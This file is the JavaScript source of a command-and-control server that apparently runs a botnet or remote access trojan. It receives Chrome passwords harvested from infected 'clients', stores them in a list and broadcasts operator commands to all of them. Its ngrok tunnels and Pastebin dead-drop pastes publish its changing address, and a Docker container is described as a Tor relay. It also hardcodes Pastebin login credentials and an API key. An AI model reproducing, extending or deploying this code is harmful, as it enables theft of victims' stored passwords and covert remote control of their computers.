var net = require('net');
//var capnp = require ('capnp');
require('log-timestamp');
var readline = require('readline');
var ngrok = require('ngrok');
var paste = require("better-pastebin");
var colors = require('colors');
var exec = require('child_process').exec;

var PASTEBIN_USERNAME = "efel"
var PASTEBIN_PASSWORD = "password"
var PASTEBIN_KEY = "6624699f38cac4c04962afe4ed8730e0"


var clients = [];
var names = [];
var chromePasswords = [];
var docker_container_id;

getPublicIP();
startPromt();
// Start a TCP Server
net.createServer(function (socket) {

  socket.name = socket.remoteAddress + ":" + socket.remotePort;
  clients.push(socket);
  socket.on('data', function (data) {
    var arr = data.toString().split("|");
    //Procces data recived using message prefix
    switch(arr[0]) {
      case "user":
        socket.nick = arr[1] +" ("+ socket.remoteAddress + ":" + socket.remotePort+")";
        names.push(socket.nick);
          console.log("New user connected: ".america +socket.nick+"\n");
        break;
      case "yn":
          console.log("\n" + arr[1] + "\n");
        break;
      case "pass":
          arrOfPass = arr[1].split("\n");
          chromePasswords.push(arrOfPass);
        //arrOfPass.forEach(function (entry) {
        //	data = entry.split(">>");
        //	savePassToSQLite(data[0], data[1], data[2]);
        //    });
        break;

      default:
          console.log("\n" + arr[1] + "\n");
        break;
    }
    });

    socket.on('end', function () {
   		clients.splice(clients.indexOf(socket), 1);
      if (socket.nick != null) {
          console.log("User disconnected: ".green + socket.nick);
      } else {
          //console.log("User disconnected: ".green + socket.name);
      }
  	});
}).listen(4434);


//Boss port
net.createServer(function (socket) {
    socket.on('data', function (data) {
      sendCommand(data);
      console.log("Recived cmd from 8000".america);
      clients.forEach(function (client) {
          if (client.nick !== "undefined") {
              socket.write(client.nick + " \n");
          }
        });
         });
 }).listen(8000);


//Promt for commands
function startPromt() {
  console.log("Server running\n".rainbow);
  var rl = readline.createInterface(process.stdin, process.stdout);
  rl.setPrompt('Command -> ');
  rl.prompt();
  rl.on('line', function (line) {
      sendCommand(line);
      rl.prompt();
    }).on('close',function(){process.exit(0);});
}

// Setup ngrok and update ip in relays
function getPublicIP() {

  //Create pastebin object
  paste.setDevKey(PASTEBIN_KEY);
  paste.login(PASTEBIN_USERNAME, PASTEBIN_PASSWORD, function (success, data) {
    if (!success) {
      console.log("Failed (" + data + ")".red);
      return false;
      }
  });

  //Get url and links it to port 4434, then save to pastebin
  ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
    console.log("NGrok Url:  ".green + url.blue);
    console.log("Starting tor Server...")
    updateTorIpServer(url);
    updatePastebin(url);
    }
  );
  ngrok.connect({proto: 'tcp', addr: 8000, region: 'eu'}, function (err, url) {
          console.log("NGrok Url boss:  ".green + url.blue);
      updatePastebinBoss(url);
      }
  );

  ngrok.connect({proto: 'tcp', addr: 22, region: 'eu'}, function (err, url) {
          console.log("SSH url:  ".green + url.blue);
      }
  );

}
function updateTorIpServer(text) {
  // Put new ip
  exec("echo '" + text + "' > ipServer/ip.html", function(error, stdout, stderr) {
    // Then Build docker
    exec('docker build -t "tiked/ip" ./ipServer', function(error, stdout, stderr) {
      // Then run it
      exec('docker run -d tiked/ip', function(error, stdout, stderr) {
        console.log("Container: " + stdout.toString());
        docker_container_id = stdout.toString();
      });
    });
  });
}
function updatePastebin(text) {
    paste.edit("BuG97BSk", text, function (success, data) {
      if (success) {
        if (text != data) {
            console.log('failed to update pastebin!!!'.bgBlue.red);
            console.log(text +" != "+ data);
            updatePastebin(text);
        }
        console.log("Updated pastebin ".cyan + "(client)".red);
          console.log("Client pastebin now: ".cyan + data.cyan);
      }
    });
}
function updatePastebinBoss(text) {
    paste.edit("LWK9KdSW", text, function (success, data) {
      if (success) {
        if (text != data) {
            console.log('failed to update pastebin!!!'.bgBlue.red);
            console.log(text +" != "+ data);
            updatePastebinBoss(text);
        }
          console.log("Updated pastebin ".cyan+ "(boos)".red);
          console.log("Boss pastebin now: ".cyan + data.cyan);
      }
    });
}

function sendCommand(command) {
    switch (command) {
    case 'help':
        console.log("Usage: [command] [target (* for all)] [argumets (spaces are -)]\n");
        break;
    case 'users':
        console.log(users);
        break;

    case 'passlist':
        console.log(chromePasswords);
        break;

    default:
        if (command != "" && command != "\n") {
            clients.forEach(function (client) {
                //Add syntax check
                client.write(command + " \n");
                // var obj = {
                //     'command':command.split(" ")[0],
                //     'aguments': command,
                //     'target': comamnd.split(" ")[1]
                // };
                // client.write(pb.serialize(obj, "Data"));
                // var newObj = pb.parse(buf, "Data") // you get plain object here, it should be exactly the same as obj
            });
        }
    }
}
/*
function savePassToSQLite(url, username, password) {
    db.serialize(function () {
        var stmt = db.prepare("INSERT INTO ChromeAccounts (URL, Username, Password) VALUES (? ,?, ?)");
        stmt.run(url, username, password);
        stmt.finalize();
    });
}*/





// Handle exit
process.on('exit', myExit);
process.on('SIGINT', myExit);
function myExit() {
  console.log("Caught interrupt signal, Stoping...".red);
  exec('docker stop ' + docker_container_id, function(error, stdout, stderr) {
    process.exit();
  });
}
